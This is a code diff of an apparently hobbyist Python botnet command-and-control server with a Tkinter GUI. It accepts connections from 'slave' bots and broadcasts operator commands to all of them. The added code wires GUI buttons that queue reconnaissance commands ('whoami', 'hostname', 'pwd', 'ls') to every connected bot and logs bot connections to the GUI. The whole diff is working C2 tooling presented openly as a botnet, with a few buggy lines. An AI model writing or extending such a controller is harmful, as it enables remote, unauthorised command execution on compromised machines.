@@ -9,9 +9,12 @@ import threading
 import queue
 import time
 import subprocess 
+
+
 q = queue.Queue()
 Socketthread = []
 ClientList = {}
+
 
 #-------------------------------------------------------------------------------------------
 
@@ -27,11 +30,14 @@ class BotHandler(threading.Thread):
     def run(self):
         BotName = threading.current_thread().getName()
         print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
+        app.insertText("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: " + BotName)
+        app.on_refreshClient_client()
         ClientList[BotName] = self.client_address
         
         while True:
             RecvBotCmd = self.q.get()
             # print("\nReceived Command: " + RecvBotCmd + " for " + BotName)
+            
             try:
 #                RecvBotCmd += "\n"
                 self.client.send(RecvBotCmd.encode('utf-8'))
@@ -53,8 +59,13 @@ class BotCmd(threading.Thread):
         self.q = qv2
 
     def run(self):
+        
+
         while True:
-            SendCmd = str(input("BotCmd> "))
+            SendCmd = ""
+            if(";" in app.getcmmd()):
+                SendCmd = app.getcmmd()[:-1]
+                app.clearcmmd()
             if (SendCmd == ""):
                 pass
             elif (SendCmd == "exit"):
@@ -65,6 +76,7 @@ class BotCmd(threading.Thread):
                 os._exit(0)
             else:
                 print("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
+                app.insertText("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
                 for i in range(len(Socketthread)):
                     time.sleep(0.1)
                     self.q.put(SendCmd)
@@ -78,6 +90,7 @@ def listener(lhost, lport, q):
     server.bind(server_address)
     server.listen(10)
     print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
+    app.insertText("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
     BotCmdThread = BotCmd(q)
     BotCmdThread.start()
     while True:
@@ -89,20 +102,24 @@ def listener(lhost, lport, q):
 #import
 import getpass
 import socket
+from os import listdir
+from os.path import isfile, join
 
 def sethostport():
     try:
-        lhost = "192.168.1.118"
-        lport = 4567
+        #lhost = "192.168.1.118"
+        lhost = "localhost"
+        lport = 8080
         listener(lhost, lport, q)
     except Exception as ex:
         print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
+        app.insertText("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")
 
 
 
 
 class botservergui:
-
+    
     def __init__(self):
 
         #1: Create a builder
@@ -118,7 +135,7 @@ class botservergui:
 
         #this here is just a test filling in clients -remove-
         lbox.select_clear(tk.END)
-        for idx in range(0, 20):
+        for idx in ClientList:
             text = 'Client {0}'.format(idx)
             lbox.insert(tk.END, text)
         lbox.see(tk.END)
@@ -138,33 +155,65 @@ class botservergui:
         textboxoutput.insert(tk.INSERT, "Info about client here")
 
     def on_pwd_clicked(self):
-        #lblcommandsent = self.builder.get_object('lblcommandsent')
-        #text = lblcommandsent.cget('text')
-        print("text")
-        #lblcommandsent.configure(text='Sending PWD command')
-	    
-    def on_whoami_clicked(self):
+        command = self.builder.get_object('insertPath')
+        command.insert('1.0', "pwd;")
+
+    def getcmmd(self):
+        command = self.builder.get_object('insertPath')
+        return command.get("1.0",'end-1c')
+    def clearcmmd(self):
+        command = self.builder.get_object('insertPath')
+        command.delete('1.0',tk.END)
+        
+    def insertText(self, txt):
         textboxoutput = self.builder.get_object('textboxoutput')
-        textboxoutput.insert('1.0', "User is " + getpass.getuser() +"\n")
+        textboxoutput.insert('1.0', txt +"\n")
+
+
+        
+    
+    def on_refreshClient_client(self):
+        box = self.builder.get_object('clientslistbox')
+        box.delete(0,'end')
+        for idx in ClientList:
+            text = 'Client {0}' + idx
+            box.insert(tk.END, text)
+        box.see(tk.END)
+        box.selection_set(tk.END)
+    
+
+
+    def on_whoami_clicked(self):
+        command = self.builder.get_object('insertPath')
+        command.insert('1.0', "whoami;")
+        
         
 
     def on_host_clicked(self):
-        textboxoutput = self.builder.get_object('textboxoutput')
-        textboxoutput.insert('1.0', "Socket is " + socket.gethostname() +"\n")
+        command = self.builder.get_object('insertPath')
+        command.insert('1.0', "hostname;")
         
-    def on_scanNetwork_clicked(self):
-      
-        address = "192.168.1.118"
+    def on_listFiles_clicked(self):
+        command = self.builder.get_object('insertPath')
+        command.insert('1.0', "ls;")
+        #path = self.builder.get_object('insertPath')
+        #mypath = path.get("1.0",'end-1c')
+        #onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
+        #text = ""
+        #for x in onlyfiles:
+            #text += "\n" + x + ""
+        #textboxoutput = self.builder.get_object('textboxoutput')
+        #textboxoutput.insert('1.0', "Files in directory:"+text+"\n" )
+        
+
     
-        res = subprocess.call(['ping', '-c', '3', address]) 
-        if res == 0: 
-            print( "ping to", address, "OK") 
-        elif res == 2: 
-            print("no response from", address) 
-        else: 
-            print("ping to", address, "failed!") 
-
-
+    def on_stop_listen(self):
+        hostname = "localhost"
+        port = 8080
+        self.running = False
+        socket.socket(socket.AF_INET, 
+                  socket.SOCK_STREAM).connect( (hostname, port))
+        self.socket.close()
 
     #make start listening button using threats so the gui dosent hang
 
